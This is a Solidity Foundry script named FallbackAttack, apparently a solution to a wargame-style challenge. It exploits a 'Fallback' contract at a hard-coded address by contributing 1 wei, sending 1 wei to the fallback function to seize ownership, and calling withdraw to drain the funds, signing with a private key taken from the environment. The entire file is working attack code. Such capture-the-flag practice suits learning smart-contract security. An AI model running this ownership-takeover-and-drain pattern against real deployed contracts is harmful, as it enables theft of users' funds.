// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";

contract FallbackAttack is Script {
    Fallback public fallbackInstance = Fallback(payable(0xF1c723AED1DfCB66feEFf6B5e4908F996DE483eb));

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{ value: 1 wei }();
        (bool success,) = address(fallbackInstance).call{ value: 1 wei }("");

        require(success, "Failed");

        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }   
}